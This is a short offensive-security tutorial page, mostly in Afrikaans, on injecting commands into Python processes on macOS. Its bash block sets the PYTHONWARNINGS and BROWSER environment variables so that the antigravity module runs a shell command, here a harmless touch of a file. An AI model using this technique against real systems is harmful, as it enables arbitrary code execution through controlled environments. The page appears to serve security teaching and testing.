# macOS Python Application Injection

{{#include ../../../banners/hacktricks-training.md}}

## Via die `PYTHONWARNINGS`- en `BROWSER`-omgewingsveranderlikes

As 'n aanvaller 'n Python-proses se omgewing kan beheer, kan die kombinasie van `PYTHONWARNINGS` en `BROWSER` command execution aktiveer wanneer Python die `antigravity`-module invoer terwyl 'n vervaardigde waarskuwingsopsie verwerk word. Die tegniek maak staat daarop dat `antigravity` 'n URL met Python se `webbrowser`-module oopmaak, wat die `BROWSER`-omgewingsveranderlike respekteer.<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## References

- [1] [Hacking met Omgewingsveranderlikes - elttam](https://www.elttam.com/blog/env/)
{{#include ../../../banners/hacktricks-training.md}}
